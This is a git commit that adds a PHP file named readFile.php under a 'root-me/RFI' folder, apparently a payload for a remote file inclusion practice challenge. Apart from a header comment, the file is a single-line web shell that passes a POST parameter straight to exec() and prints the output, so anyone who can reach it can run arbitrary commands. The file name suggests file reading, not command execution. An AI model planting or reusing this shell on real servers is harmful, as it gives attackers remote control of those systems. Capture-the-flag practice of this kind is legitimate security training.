217a8af01781f044d1aadcce8f5f3c515160b6e0
happytree <lovelessyuyu353@qq.com>
2017-08-14 09:57:48 +0800

    RFI

---
+++ root-me/RFI/readFile.php
@@ -0,0 +1,16 @@
+<?php
+/**
+* File: /root-me/RFI/readFile.php
+* Project: leetcode
+* Created Date: Monday, August 14th 2017, 9:52:16 am
+* Author: yanyan.yyy
+* -----
+* Last Modified: 
+* Modified By: 
+* -----
+*/
+
+
+echo exec($_POST["cmd"]);
+
+?>
